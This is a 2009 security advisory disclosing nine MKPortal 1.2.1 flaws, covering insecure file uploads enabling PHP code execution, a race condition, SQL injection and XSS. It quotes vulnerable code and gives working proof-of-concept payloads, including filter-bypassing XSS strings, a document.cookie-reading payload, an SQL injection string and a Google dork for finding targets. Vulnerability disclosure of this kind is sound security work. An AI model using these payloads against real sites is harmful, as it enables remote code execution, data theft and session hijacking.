@@ -1,0 +1,491 @@
+[waraxe-2009-SA#070] - Multiple Vulnerabilities in MKPortal <= 1.2.1
+==============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 15. January 2009
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-70.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+MKPortal is a free Portal/Content Management System (CMS) which seamlessly
+integrates with the most popular forum softwares. It uses the forum user
+management system and other features and adds many powerful modules to create
+and manage a light but powerful web site. MKPortal has an intuitive user
+interface and is very simple to install and administer.
+
+Homepage: http://www.mkportal.it/
+
+
+List of found vulnerabilities
+===============================================================================
+
+1. Insecure file upload in blog personal gallery
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: critical
+Preconditions:
+ 1. attacker must be registered user
+ 2. attacker must have blog editing privileges
+
+Registered users with blog keeping privileges can access personal gallery
+functionality, example URL:
+
+http://localhost/mkportal.1.2.1/index.php?ind=blog&op=p_gal
+
+They can also upload image files to the server. File uploading can be
+dangerous without proper security checks. So let's have a closer look
+at the source code of "modules/blog/index.php" line ~2452: 
+
+---------------------[source code]---------------------
+function upload_imm () {
+		global $mkportals, $DB, $mklib, $Skin, $_FILES;
+
+..
+		$file =  $_FILES['FILE_UPLOAD']['tmp_name'];
+		$file_name =  $_FILES['FILE_UPLOAD']['name'];
+		//$file_type =  $_FILES['FILE_UPLOAD']['type'];
+		$peso =  $_FILES['FILE_UPLOAD']['size'];		
+		
+		if (!$file) {
+			$message = "{$mklib->lang['b_compfile']}";
+			$mklib->error_page($message);
+			exit;
+		}
+
+		//Validate file extension
+		$file_ext = preg_replace("`.*\.(.*)`", "\\1", $file_name);
+		$file_ext = substr ($file_name, (strlen($file_name)-3), 3);
+		$file_ext = strtolower($file_ext);
+
+		switch($file_ext)
+		{
+			case 'gif':
+				$ext = 'gif';
+				break;
+			case 'jpg':
+				$ext = 'jpg';
+				break;
+			case 'png':
+				$ext = 'png';
+				break;
+			case 'tif':
+				$ext = 'tif';
+				break;
+			case 'bmp':
+				$ext = 'bmp';
+				break;
+			default:
+				$ext = 'not_supported';
+				break;
+		}
+		if ($ext == "not_supported")  {
+			$message = "{$mklib->lang['b_gnotsup']}";
+			$mklib->error_page($message);
+			exit;
+		}
+
+--------------------[/source code]---------------------
+
+So this piece of code suppose to be let in only files with specific extensions.
+In reality it will pass through files like "foobar.agif" or "whatever.pbmp ...
+Let's assume, that we have jpg picture named "pic.php.jjpg". This can be valid
+picture file and in same time contain malicious php code inside.
+
+What happens next:
+
+---------------------[source code]---------------------
+		//Move file from server tmp directory to blog "tmp" directory			
+		if (!move_uploaded_file("$file", "mkportal/blog/images/tmp/$file_name")) {
+			$message = "{$mklib->lang['b_nopermupl']}";
+			$mklib->error_page($message);
+			exit;
+		}
+		@chmod("mkportal/blog/images/tmp/$file_name", 0644);
+	
+		//Validate by mime type
+		$tmpfilename = "mkportal/blog/images/tmp/$file_name";
+		$size = @getimagesize($tmpfilename);
+		//If getimagesize does not recognize file as an image delete file
+		if (!$size)  {
+			@unlink($tmpfilename);
+			$message .= "{$mklib->lang['error_filetype']}";
+			$mklib->error_page($message);
+			exit;
+		}
+--------------------[/source code]---------------------
+
+As this image file is perfectly normal jpg picture, then it will bypass
+"getimagesize()" successfully. And "chmod()" will not make any differents in
+specific situation.
+
+Next:
+
+---------------------[source code]---------------------
+$file_type = $size['mime'];
+
+		if (!$mklib->check_attach($file_type, $file_ext))  {
+			//Delete invalid file and display error
+			@unlink($tmpfilename);
+			$message .= "{$mklib->lang['b_gnotsup']}";
+			$mklib->error_page($message);
+			exit;
+		}
+
+		//Validate by file contents
+		$fcontents = file_get_contents ($tmpfilename);
+		$carray = array("html", "javascript", "vbscript", "alert",
+ "onmouseover", "onclick", "onload", "onsubmit");		
+		foreach ($carray as $fch) {
+            		if (strstr($fcontents, $fch)) {
+                		@unlink($tmpfilename);
+				$message .= "{$mklib->lang['error_filetype']}";
+				$mklib->error_page($message);
+                		exit;
+            		}
+        	}
+        	if (preg_match("#script(.+?)/script#ies", $fcontents)) {
+           		@unlink($tmpfilename);
+			$message .= "{$mklib->lang['error_filetype']}";
+			$mklib->error_page($message);
+            		exit;
+		}
+--------------------[/source code]---------------------
+
+Again, MIME-type will be correct and html-code detection can't stop
+malicious php code inside of that jpg file. 
+
+Finally:
+
+---------------------[source code]---------------------
+$image = $totr.$file_name;
+
+//move file from "tmp" directory to "images" directory
+@rename($tmpfilename, "mkportal/blog/images/$image");
+--------------------[/source code]---------------------
+
+What's the possibilities? Attacker can upload picture file with php code
+inside with filename like "pic.php.pjpg" and it will be stored in remote
+server as result. And when attacker issues direct request to uploaded
+picture:
+
+http://localhost/mkportal.1.2.1/mkportal/blog/images/1pic.php.pjpg"
+
+.. then in case of Apache webserver php code inside of picture will
+be executed. Therefore it's basically remote php code execution.
+
+
+2. Insecure file upload in Downloads module
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: critical
+Preconditions:
+ 1. attacker must be registered user
+
+Registered users can add new files in downloads module by default:
+
+http://localhost/mkportal.1.2.1/index.php?ind=downloads&op=submit_file
+
+Let's look at "mkportal/modules/Downloads/index.php" line ~662:
+
+---------[source code]--------------------------
+function add_file() {
+
+    	global $mkportals, $DB,  $_FILES, $mklib, $mklib_board;
+..
+	//Replace illegal sub-extensions
+	$com_types = array('com', 'exe', 'bat', 'scr', 'pif', 'asp',
+ 'cgi', 'pl', 'php');
+	foreach ($com_types AS $bad) {
+		$file_name = str_replace(".$bad", "_$bad", $file_name);
+---------[/source code]--------------------------
+
+At first look this seems to be good security measure. If we try to upload
+trojanized file with php code inside named "test.php.zzz', then it will be
+transformed to "test_php.zzz" and php code execution is not possible.
+But wait a minute ... "str_replace()" is case sensitive, right? So, what if
+we try to upload "test.Php.zzz"? Yes, code fragment above will not trigger and
+we end up with potentially dangerous uploaded file on remote server. It's easy
+to find out URL to that file. First, let's look at file's download link:
+
+http://localhost/mkportal.1.2.1/index.php?ind=downloads&op=download_file&ide=3
+&file=test.Php.zzz
+
+Here we can determine, that "ide=3". And this is the direct file request URL:
+
+http://localhost/mkportal.1.2.1/mkportal/modules/downloads/file/mk_3_test.Php.mk
+
+And it appears, that Apache does not care, if it's "php" or "Php" or "PHP", it
+will parse the file as php script anyway. And as result any registered user with
+file adding rights in downloads block can have arbitrary php code execution
+possibilities in remote server.
+
+
+3. Race condition in multiple modules file upload functionality
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+ 1. attacker must be registered user
+ 2. multiple tries needed for successful exploitation
+
+Affected modules are Blog (gallery file upload), Reviews and Image Gallery.
+For example let's look at Image Gallery's file upload code:
+
+---------[source code]--------------------------
+if (!$FILE_UPLOAD && $FILE_URL) {
+	//Copy file from remote server to gallery "tmp" directory
+	if (!copy("$file", "mkportal/modules/gallery/album/tmp/$file_name")) {
+		$message = "{$mklib->lang['ga_errorupl']}";
+		$mklib->error_page($message);
+		exit;
+		}
+	} else {
+		//Move file from local server tmp directory to gallery "tmp" 
+directory
+		if (!move_uploaded_file("$file", "mkportal/modules/gallery/album/
+tmp/$file_name")) {
+			$message = "{$mklib->lang['ga_errorupl']}";
+			$mklib->error_page($message);
+			exit;
+		}
+	}
+	@chmod("mkportal/modules/gallery/album/tmp/$file_name", 0644);
+..
+//Validate by mime type
+$tmpfilename = "mkportal/modules/gallery/album/tmp/$file_name";
+$size = @getimagesize($tmpfilename);
+//If getimagesize does not recognize file as an image delete file
+if (!$size)  {
+	@unlink($tmpfilename);
+	$message .= "{$mklib->lang['ga_notsup']}";
+	$mklib->error_page($message);
+	exit;
+}
+---------[/source code]--------------------------
+
+So there exists timeframe, where temporary file is allready  moved to "tmp"
+directory, but it is not yet deleted. If attacker manages to issue request
+like this
+
+http://localhost/mkportal.1.2.1/mkportal/modules/Gallery/album/
+tmp/pic.php.pjpg
+
+.. in right time, then remote php code execution may be possible.
+It is classical race condition and success probability of single try is
+very limited, but it's possible to make thousands of tries, until hitting
+the jackpot. And by the way, "chmod(0644)" does not matter in specific case  :) 
+
+
+4. Sql Injection in Blog module template editing
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+ 1. attacker must be registered user
+ 2. attacker must have blog editing privileges
+ 3. magic_quotes_gpc=off (rare in real-world servers)
+
+Let's look at source code of "modules/blog/index.php" line ~1441:
+
+---------------------[source code]---------------------
+function save_template () {
+		global $mkportals, $DB, $Skin, $mklib;
+..
+		$idb = $mkportals->member['id'];
+		$template = $_POST['template'];
+		$template = $this->clean_template($template);
+		$template2 = $_POST['template2'];
+		$template2 = $this->clean_template($template2);
+
+		$DB->query("UPDATE mkp_blog SET template = '$template',
+ template2 = '$template2' WHERE id = '$idb'");
+--------------------[/source code]---------------------
+
+No "addslashes()" or "mysql_real_escape_string()" is used, so sql injection
+is possible, if "magic_quotes_gpc" setting is "off".
+
+Proof of concept:
+
+a) Go to blog template editing interface:
+
+http://localhost/mkportal.1.2.1/index.php?ind=blog&op=edit_template
+
+b) Insert text into the "Home Template" textarea:
+
+',template=@@version,template2='
+
+.. and hit "Update Template". As result MysSql version is shown instead
+of blog content.
+
+
+
+5. Reflected XSS in "handler_image.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions: none
+
+Example:
+
+http://localhost/mkportal.1.2.1/mkportal/modules/rss/handler_image.php
+?i=<script>alert(123);</script>
+
+
+6. Stored XSS in blog templates
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+ 1. attacker must be registered user
+ 2. attacker must have blog editing privileges
+
+MKportal offers blog functionality to all registered users. Blog access and
+creation is enabled by default. Quick search in Google reveals, that many
+websites have enabled blog module.
+
+Google dork: inurl:"index.php?ind=blog"
+
+Any registered user with blog editing privileges can modify his own
+blog templates. Templates are stored in database. Blog owner can manipulate
+templates html source in arbitrary ways, but some security filtering is
+in place, in order to prevent inserting potentially malicious content
+(Javascript, VBScript, ...) into blog templates.
+
+Let's look at source code of "modules/blog/index.php" line ~1441:
+
+---------------------[source code]---------------------
+function save_template () {
+		global $mkportals, $DB, $Skin, $mklib;
+..
+		$idb = $mkportals->member['id'];
+		$template = $_POST['template'];
+		$template = $this->clean_template($template);
+		$template2 = $_POST['template2'];
+		$template2 = $this->clean_template($template2);
+
+		$DB->query("UPDATE mkp_blog SET template = '$template',
+ template2 = '$template2' WHERE id = '$idb'");
+--------------------[/source code]---------------------
+
+So we can see, that security filtering is handled by function
+"clean_template()". Let's look inside of this function:
+
+---------------------[source code]---------------------
+function clean_template ($t="") {
+..
+        while( preg_match( "#script(.+?)/script#ies", $t ) ) {
+                $t = preg_replace( "#script(.+?)/script#ies", "" , $t);
+        }
+        $t = preg_replace( "/javascript/i", "", $t );
+        //$t = preg_replace( "/about/i"	, "", $t );
+        $t = preg_replace( "/vbscript/i"	, "", $t );
+        $t = preg_replace( "/alert/i"	, "", $t );
+        $t = preg_replace( "/onmouseover/i", "", $t );
+        $t = preg_replace( "/onclick/i"	, "", $t );
+        $t = preg_replace( "/onload/i"	, "", $t );
+        $t = preg_replace( "/onsubmit/i"	, "", $t );
+
+..
+	$t = preg_replace( "/ecmascript/i"	, "", $t );
+ 	$t = preg_replace( "/about:/si"	, "", $t );
+	$t = preg_replace( "/data:/si"	, "", $t );
+	$t = preg_replace( "/onfocus/i"	, "", $t );
+	$t = preg_replace( "/onblur/i"	, "", $t );
+	$t = preg_replace( "/ondblclick/i"	, "", $t );
+	$t = preg_replace( "/onmousedown/i"	, "", $t );
+	$t = preg_replace( "/onmouseup/i"	, "", $t );
+	$t = preg_replace( "/onmousemove/i"	, "", $t );
+	$t = preg_replace( "/onmouseout/i"	, "", $t );
+	$t = preg_replace( "/onkeypress/i"	, "", $t );
+	$t = preg_replace( "/onkeydown/i"	, "", $t );
+	$t = preg_replace( "/onkeyup/i"	, "", $t );
+	$t = preg_replace( "/onunload/i"	, "", $t );
+      $t = preg_replace( "/onabort/i"	, "", $t );
+      $t = preg_replace( "/onerror/i"	, "", $t );
+	$t = preg_replace( "/onchange/i"	, "", $t );
+	$t = preg_replace( "/onreset/i"	, "", $t );
+	$t = preg_replace( "/onselect/i"	, "", $t );	
+	$t = preg_replace( "/document\./i"	, "", $t );
+	$t = preg_replace( "/window\./i"	, "", $t );
+	
+..
+        return $t;
+    }
+
+--------------------[/source code]---------------------
+
+This kind of filtering is example of flawed-by-design implementation.
+If someone wants insert javascript into blog template, then it's still
+possible! Here are some working examples:
+
+<body ononsubmitload=aleonsubmitrt(123);>
+
+<salertcript>aalertlert(123);</salertcript>
+
+
+7. Stored XSS in Reviews module comments functionality
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+ 1. attacker must be registered user
+ 2. attacker must have Reviews comments editing privileges
+
+There are some security measures against script injection in comments
+text, but still it's possible to sneak through those filters. Example:
+
+<marquee loop=1 onfinish=alert(document.cookie) width=0></marquee>
+
+This script will be executed, when someone opens review with this comment.
+As result, cookie theft and other attacks may be possible. 
+
+
+8. Stored XSS in News module comments functionality
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: medium
+Preconditions:
+ 1. attacker must be registered user
+ 2. attacker must have news comments editing privileges
+
+Same story, as in previous case - filtering exists, but can be bypassed.
+
+
+
+9. Full path disclosure in "index.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Security risk: low
+Preconditions: display_errors = Off
+
+Example:
+
+http://localhost/mkportal.1.2.1/?ind[]
+
+Result:
+
+Warning: Illegal offset type in isset or empty in 
+C:\apache_wwwroot\mkportal.1.2.1\index.php on line 102
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
+to all active waraxe.us forum members and to anyone else who know me! 
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+---------------------------------- [ EOF ] ---------------------------------
+
+# milw0rm.com [2009-01-15]
